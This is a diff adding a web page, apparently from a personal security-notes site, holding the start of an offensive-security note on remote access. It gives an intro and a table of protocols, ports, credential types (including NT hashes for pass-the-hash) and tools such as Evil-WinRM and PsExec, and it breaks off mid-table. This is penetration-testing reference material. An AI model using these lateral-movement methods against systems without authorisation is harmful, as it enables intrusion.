@@ -1,0 +1,984 @@
+<!DOCTYPE html><html lang="en" data-theme="dful-dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><script>
+      (() => {
+        const storageKey = 'dful-theme';
+        const schemaKey = 'dful-theme-schema';
+        const schemaVersion = '2';
+        const legacyStorageKey = 'dful-theme-preview';
+        const valid = new Set(["dful-dark","amber-dark","dful-light","flexoki-paper","phosphor","arcade","cobalt"]);
+        const dark = new Set(["dful-dark","amber-dark","phosphor","arcade","cobalt"]);
+        const fallback = "dful-dark";
+        let theme = fallback;
+        try {
+          const needsMigration = localStorage.getItem(schemaKey) !== schemaVersion;
+          let stored = localStorage.getItem(storageKey);
+          if (needsMigration) {
+            if (stored === 'graphite') stored = 'dful-dark';
+            else if (stored === 'dful-dark') stored = 'amber-dark';
+            localStorage.setItem(schemaKey, schemaVersion);
+            if (stored) localStorage.setItem(storageKey, stored);
+          }
+          if (valid.has(stored)) theme = stored;
+          else {
+            let legacy = localStorage.getItem(legacyStorageKey);
+            if (needsMigration) {
+              if (legacy === 'graphite') legacy = 'dful-dark';
+              else if (legacy === 'dful-dark') legacy = 'amber-dark';
+            }
+            if (valid.has(legacy)) {
+              theme = legacy;
+              localStorage.setItem(storageKey, legacy);
+            }
+            if (legacy) localStorage.removeItem(legacyStorageKey);
+          }
+          localStorage.setItem(storageKey, theme);
+        } catch {}
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.style.colorScheme = dark.has(theme) ? 'dark' : 'light';
+      })();</script><meta name="description" content="Operational reference for turning reachable protocols and authentication material into remote sessions or execution."><link rel="canonical" href="https://dful.github.io/en/notes/remote-access/"><link rel="alternate" hreflang="en" href="https://dful.github.io/en/notes/remote-access/"><link rel="alternate" hreflang="es" href="https://dful.github.io/es/notes/acceso-remoto/"><link rel="alternate" hreflang="x-default" href="https://dful.github.io/en/notes/remote-access/"><meta property="og:url" content="https://dful.github.io/en/notes/remote-access/"><meta property="og:type" content="website"><meta property="og:site_name" content="dful"><meta property="og:title" content="Remote Access · dful"><meta property="og:description" content="Operational reference for turning reachable protocols and authentication material into remote sessions or execution."><meta property="og:locale" content="en_GB"><meta property="og:locale:alternate" content="es_ES"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Remote Access · dful"><meta name="twitter:description" content="Operational reference for turning reachable protocols and authentication material into remote sessions or execution."><meta name="generator" content="Astro v7.3.2"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>Remote Access · dful</title><link rel="stylesheet" href="/_astro/notes.DkEzeG-w.css"><link rel="stylesheet" href="/_astro/BaseLayout.l85KjHsw.css"><link rel="stylesheet" href="/_astro/publishing.C5o61NTe.css"></head><body><a class="skip-link" href="#main">Skip to content</a><header class="site-header"><div class="header-inner"><a class="wordmark" href="/en/" aria-label="dful home">dful<span>.</span></a><nav class="primary-nav" aria-label="Primary"><a href="/en/" data-active="false">Home</a><a href="/en/notes/" data-active="true" aria-current="page">Notes</a><a href="/en/research/" data-active="false">Research</a><a href="/en/about/" data-active="false">About</a></nav><div class="header-actions"><details class="theme-picker" data-theme-picker data-astro-cid-hcqnpaxe><summary aria-label="Theme" data-astro-cid-hcqnpaxe><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 3.25a8.75 8.75 0 1 0 0 17.5h1.25a2.25 2.25 0 0 0 0-4.5h-.75a1.75 1.75 0 0 1 0-3.5h2.35A5.9 5.9 0 0 0 20.75 6.9C18.72 4.63 15.72 3.25 12 3.25Z"></path><circle cx="7.4" cy="10" r=".7" fill="currentColor" stroke="none"></circle><circle cx="9.25" cy="6.9" r=".7" fill="currentColor" stroke="none"></circle><circle cx="13" cy="6.2" r=".7" fill="currentColor" stroke="none"></circle><circle cx="16.25" cy="8" r=".7" fill="currentColor" stroke="none"></circle></svg><span class="theme-current" data-theme-current data-astro-cid-hcqnpaxe>Dful Dark</span></summary><div class="theme-menu" aria-label="Theme" data-astro-cid-hcqnpaxe><div class="theme-menu-head" data-astro-cid-hcqnpaxe>Theme</div><button type="button" aria-pressed="true" data-theme-option="dful-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#111214" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f0eee8" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff8b3d" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Dark</span></button><button type="button" aria-pressed="false" data-theme-option="amber-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#0c0c0b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f2efe7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff9f2f" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Amber Dark</span></button><button type="button" aria-pressed="false" data-theme-option="dful-light" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#f7f3ea" data-astro-cid-hcqnpaxe></i><i style="--swatch:#171511" data-astro-cid-hcqnpaxe></i><i style="--swatch:#b94d08" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Light</span></button><button type="button" aria-pressed="false" data-theme-option="flexoki-paper" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#fffcf0" data-astro-cid-hcqnpaxe></i><i style="--swatch:#100f0f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#bc5215" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Flexoki Paper</span></button><button type="button" aria-pressed="false" data-theme-option="phosphor" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#030604" data-astro-cid-hcqnpaxe></i><i style="--swatch:#c8f7cf" data-astro-cid-hcqnpaxe></i><i style="--swatch:#48ff78" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Phosphor</span></button><button type="button" aria-pressed="false" data-theme-option="arcade" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#11102b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#fff4d7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#4de9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Arcade</span></button><button type="button" aria-pressed="false" data-theme-option="cobalt" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#07111f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#edf6ff" data-astro-cid-hcqnpaxe></i><i style="--swatch:#42b9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Cobalt</span></button></div></details><script>
+  (() => {
+    const storageKey = 'dful-theme';
+    const themes = [{"id":"dful-dark","name":"Dful Dark","colorScheme":"dark"},{"id":"amber-dark","name":"Amber Dark","colorScheme":"dark"},{"id":"dful-light","name":"Dful Light","colorScheme":"light"},{"id":"flexoki-paper","name":"Flexoki Paper","colorScheme":"light"},{"id":"phosphor","name":"Phosphor","colorScheme":"dark"},{"id":"arcade","name":"Arcade","colorScheme":"dark"},{"id":"cobalt","name":"Cobalt","colorScheme":"dark"}];
+    const valid = new Set(themes.map(({ id }) => id));
+    const names = Object.fromEntries(themes.map(({ id, name }) => [id, name]));
+    const isDark = (theme) => themes.find((item) => item.id === theme)?.colorScheme === 'dark';
+    const apply = (theme) => {
+      const selected = valid.has(theme) ? theme : "dful-dark";
+      document.documentElement.dataset.theme = selected;
+      document.documentElement.style.colorScheme = isDark(selected) ? 'dark' : 'light';
+      try { localStorage.setItem(storageKey, selected); } catch {}
+      document.querySelectorAll('[data-theme-picker]').forEach((picker) => {
+        const current = picker.querySelector('[data-theme-current]');
+        if (current) current.textContent = names[selected];
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.setAttribute('aria-pressed', button.getAttribute('data-theme-option') === selected ? 'true' : 'false'));
+      });
+    };
+    const enhance = () => {
+      document.querySelectorAll('[data-theme-picker]:not([data-enhanced])').forEach((picker) => {
+        picker.setAttribute('data-enhanced','true');
+        picker.addEventListener('keydown', (event) => {
+          if (event.key === 'Escape' && picker.open) {
+            picker.removeAttribute('open');
+            picker.querySelector('summary').focus();
+          }
+        });
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.addEventListener('click', () => {
+          apply(button.getAttribute('data-theme-option'));
+          picker.removeAttribute('open');
+          picker.querySelector('summary').focus();
+        }));
+      });
+      let stored = "dful-dark";
+      try { stored = localStorage.getItem(storageKey) || stored; } catch {}
+      apply(stored);
+    };
+    enhance();
+    document.addEventListener('astro:page-load', enhance);
+  })();</script><nav class="lang-switch" aria-label="Switch language"><a href="/en/notes/remote-access/" data-active="true" aria-current="page">EN</a><a href="/es/notes/acceso-remoto/" data-active="false">ES</a></nav><div class="social-links" aria-label="Social links"><a href="https://github.com/dful" rel="me">GitHub</a><a href="https://www.linkedin.com/in/daniel-fulladosa/" rel="me">LinkedIn</a></div></div></div></header><main id="main"><div class="notes-page" data-note-slug="remote-access"><div class="notes-shell"><aside class="notes-tree" aria-label="Knowledge tree"><div class="notes-side-head"><strong>Knowledge tree</strong></div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="en"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentals</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-context" data-active-path="false"><a href="/en/notes/tokens-context/"><span>Tokens &amp; Context</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inference" data-active-path="false"><a href="/en/notes/inference/"><span>Inference</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:reasoning" data-active-path="false"><a href="/en/notes/reasoning/"><span>Reasoning</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:context-engineering" data-active-path="false"><a href="/en/notes/context-engineering/"><span>Context Engineering</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agents</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:agent-loop" data-active-path="false"><a href="/en/notes/agent-loop/"><span>Agent Loop</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-harness" data-active-path="false"><a href="/en/notes/agent-harness/"><span>Agent Harness</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:tool-use" data-active-path="false"><a href="/en/notes/tool-use/"><span>Tool Use</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagents" data-active-path="false"><a href="/en/notes/subagents/"><span>Subagents</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Security</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:prompt-injection" data-active-path="false"><a href="/en/notes/prompt-injection/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-permissions" data-active-path="false"><a href="/en/notes/agent-permissions/"><span>Agent Permissions</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-egress" data-active-path="false"><a href="/en/notes/sandboxing-egress/"><span>Sandboxing &amp; Egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>Applied AI</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:model-apis" data-active-path="false"><a href="/en/notes/model-apis/"><span>Model APIs</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:api-pricing" data-active-path="false"><a href="/en/notes/api-pricing/"><span>API Pricing</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:deployment-models" data-active-path="false"><a href="/en/notes/deployment-models/"><span>Deployment Models</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:local-inference" data-active-path="false"><a href="/en/notes/local-inference/"><span>Local Inference</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Offensive Security</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="true"><details open><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:remote-access" data-active-path="true"><a href="/en/notes/remote-access/" aria-current="page"><span>Remote Access</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="false"><details><summary><span>File Transfer</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:windows-file-transfers" data-active-path="false"><a href="/en/notes/windows-file-transfers/"><span>Windows File Transfers</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:linux-file-transfers" data-active-path="false"><a href="/en/notes/linux-file-transfers/"><span>Linux File Transfers</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="false"><details><summary><span>Web Applications</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:php-web-testing" data-active-path="false"><a href="/en/notes/php-web-testing/"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></aside><div class="notes-detail-shell"><article class="notes-article"><div class="notes-mobile-nav"><details><summary>Knowledge tree</summary><div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="en"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentals</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-context" data-active-path="false"><a href="/en/notes/tokens-context/"><span>Tokens &amp; Context</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inference" data-active-path="false"><a href="/en/notes/inference/"><span>Inference</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:reasoning" data-active-path="false"><a href="/en/notes/reasoning/"><span>Reasoning</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:context-engineering" data-active-path="false"><a href="/en/notes/context-engineering/"><span>Context Engineering</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agents</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:agent-loop" data-active-path="false"><a href="/en/notes/agent-loop/"><span>Agent Loop</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-harness" data-active-path="false"><a href="/en/notes/agent-harness/"><span>Agent Harness</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:tool-use" data-active-path="false"><a href="/en/notes/tool-use/"><span>Tool Use</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagents" data-active-path="false"><a href="/en/notes/subagents/"><span>Subagents</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Security</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:prompt-injection" data-active-path="false"><a href="/en/notes/prompt-injection/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:agent-permissions" data-active-path="false"><a href="/en/notes/agent-permissions/"><span>Agent Permissions</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-egress" data-active-path="false"><a href="/en/notes/sandboxing-egress/"><span>Sandboxing &amp; Egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>Applied AI</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:model-apis" data-active-path="false"><a href="/en/notes/model-apis/"><span>Model APIs</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:api-pricing" data-active-path="false"><a href="/en/notes/api-pricing/"><span>API Pricing</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:deployment-models" data-active-path="false"><a href="/en/notes/deployment-models/"><span>Deployment Models</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:local-inference" data-active-path="false"><a href="/en/notes/local-inference/"><span>Local Inference</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Offensive Security</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="true"><details open><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:remote-access" data-active-path="true"><a href="/en/notes/remote-access/" aria-current="page"><span>Remote Access</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="false"><details><summary><span>File Transfer</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:windows-file-transfers" data-active-path="false"><a href="/en/notes/windows-file-transfers/"><span>Windows File Transfers</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:linux-file-transfers" data-active-path="false"><a href="/en/notes/linux-file-transfers/"><span>Linux File Transfers</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="false"><details><summary><span>Web Applications</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:php-web-testing" data-active-path="false"><a href="/en/notes/php-web-testing/"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></div></details><details><summary>On this page</summary><div><ul><li data-depth="2"><a href="#quick-reference">Quick reference</a></li><li data-depth="2"><a href="#authentication-material">Authentication material</a></li><li data-depth="3"><a href="#local-and-domain-accounts">Local and domain accounts</a></li><li data-depth="3"><a href="#passwords">Passwords</a></li><li data-depth="3"><a href="#nt-hashes">NT hashes</a></li><li data-depth="3"><a href="#kerberos-tickets-and-caches">Kerberos tickets and caches</a></li><li data-depth="4"><a href="#getting-a-tgt-from-linux">Getting a TGT from Linux</a></li><li data-depth="4"><a href="#realm-dns-spn-and-time">Realm, DNS, SPN, and time</a></li><li data-depth="3"><a href="#ssh-keys-and-certificates">SSH keys and certificates</a></li><li data-depth="3"><a href="#x509-certificates">X.509 certificates</a></li><li data-depth="2"><a href="#ssh">SSH</a></li><li data-depth="3"><a href="#password">Password</a></li><li data-depth="3"><a href="#private-key">Private key</a></li><li data-depth="3"><a href="#running-a-command">Running a command</a></li><li data-depth="3"><a href="#adding-a-temporary-key">Adding a temporary key</a></li><li data-depth="3"><a href="#jump-hosts">Jump hosts</a></li><li data-depth="2"><a href="#rdp">RDP</a></li><li data-depth="3"><a href="#password-and-windows-credentials">Password and Windows credentials</a></li><li data-depth="3"><a href="#nt-hash-and-restricted-admin">NT hash and Restricted Admin</a></li><li data-depth="3"><a href="#kerberos">Kerberos</a></li><li data-depth="2"><a href="#winrm-and-powershell-remoting">WinRM and PowerShell Remoting</a></li><li data-depth="3"><a href="#powershell-from-windows">PowerShell from Windows</a></li><li data-depth="3"><a href="#winrs">WinRS</a></li><li data-depth="3"><a href="#evil-winrm">Evil-WinRM</a></li><li data-depth="3"><a href="#netexec">NetExec</a></li><li data-depth="3"><a href="#client-certificate">Client certificate</a></li><li data-depth="3"><a href="#second-hop">Second hop</a></li><li data-depth="2"><a href="#smb-and-service-control-manager">SMB and Service Control Manager</a></li><li data-depth="3"><a href="#psexec">PsExec</a></li><li data-depth="3"><a href="#smbexec">SMBExec</a></li><li data-depth="3"><a href="#netexec-1">NetExec</a></li><li data-depth="2"><a href="#wmi-and-cim">WMI and CIM</a></li><li data-depth="3"><a href="#impacket-wmiexec">Impacket WMIExec</a></li><li data-depth="3"><a href="#netexec-wmi">NetExec WMI</a></li><li data-depth="3"><a href="#cim-over-ws-man">CIM over WS-Man</a></li><li data-depth="3"><a href="#cim-over-dcom">CIM over DCOM</a></li><li data-depth="3"><a href="#legacy-wmic">Legacy WMIC</a></li><li data-depth="2"><a href="#scheduled-tasks">Scheduled Tasks</a></li><li data-depth="3"><a href="#impacket-atexec">Impacket atexec</a></li><li data-depth="3"><a href="#schtasks">schtasks</a></li><li data-depth="2"><a href="#troubleshooting">Troubleshooting</a></li><li data-depth="3"><a href="#authentication-and-authorization">Authentication and authorization</a></li><li data-depth="3"><a href="#kerberos-1">Kerberos</a></li><li data-depth="3"><a href="#switching-mechanisms">Switching mechanisms</a></li><li data-depth="2"><a href="#references">References</a></li></ul></div></details></div><header class="notes-header"><div class="notes-header-pretitle"><nav class="notes-breadcrumb" aria-label="Breadcrumb"><span>Offensive Security</span><i aria-hidden="true">/</i><span>Shells</span></nav></div><h1>Remote Access</h1><div class="notes-deck">Operational reference for turning reachable protocols and authentication material into remote sessions or execution.</div><small>Updated 25 Aug 2026</small></header><div class="publishing-prose"><p>Remote access depends on four elements: a reachable protocol, compatible authentication material, authorization on the service, and the interaction that the mechanism can provide. Keeping them separate avoids discarding valid credentials because one interface fails and makes it easier to switch paths when a target exposes several options.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<div class="pub-table-wide">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Network</th><th>Interaction</th><th>Authentication material</th><th>Main authorization requirement</th><th>Common clients</th></tr></thead><tbody><tr><td>SSH</td><td>TCP/22 by default</td><td>shell, command</td><td>password, private key, SSH certificate</td><td>account allowed by <code>sshd</code></td><td>OpenSSH</td></tr><tr><td>RDP</td><td>TCP/3389 by default</td><td>desktop</td><td>password, Windows credentials, Kerberos; NT hash with Restricted Admin</td><td>RDP logon right; local admin for Restricted Admin</td><td><code>mstsc</code>, FreeRDP</td></tr><tr><td>WinRM / PSRP</td><td>TCP/5985 or 5986 by default</td><td>PowerShell, shell, command</td><td>password, Kerberos, NT hash with supporting clients, mapped certificate</td><td>WinRM/PSRP endpoint authorization</td><td>PowerShell, <code>winrs</code>, Evil-WinRM, NetExec</td></tr><tr><td>SMB / SCM</td><td>TCP/445</td><td>shell or command</td><td>password, NT hash, Kerberos</td><td>administrative SMB and SCM access</td><td>PsExec, Impacket, NetExec</td></tr><tr><td>WMI / DCOM</td><td>TCP/135 + dynamic RPC; output may require another channel</td><td>command, semi-interactive shell</td><td>password, NT hash, Kerberos</td><td>WMI/DCOM 